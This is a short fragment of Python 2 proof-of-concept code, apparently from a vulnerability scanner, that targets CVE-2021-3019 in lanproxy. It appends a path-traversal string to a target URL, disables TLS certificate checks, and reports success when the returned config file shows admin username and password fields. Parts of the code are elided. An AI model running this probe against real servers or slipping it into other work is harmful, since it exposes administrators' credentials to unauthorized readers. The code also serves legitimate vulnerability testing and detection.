...
def poc(url):
    ...
    try:
        ...
        url = url + '/../conf/config.properties'
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        r = requests.get(url, headers=header, timeout=10, allow_redirects=False, verify=False)
        if r.status_code == 200 and "config.admin.username" in r.content and "config.admin.password" in r.content:
            return '[lanproxy cve-2021-3019]\t' + url
        else:
            return False
    except Exception, e:
        return False
